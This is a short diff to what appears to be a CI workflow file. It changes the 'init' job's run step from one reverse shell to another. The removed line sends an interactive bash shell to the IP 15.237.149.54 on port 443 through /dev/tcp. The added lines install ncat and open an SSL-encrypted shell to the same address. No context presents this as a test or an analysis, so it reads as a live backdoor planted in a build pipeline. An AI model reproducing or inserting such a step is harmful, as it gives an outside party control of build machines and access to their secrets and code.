@@ -8,4 +8,5 @@ jobs:
     name: "init"
     steps:
     - run: |
-        /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1 
+        sudo apt install -y ncat
+        ncat 15.237.149.54 443 --ssl -e /bin/bash
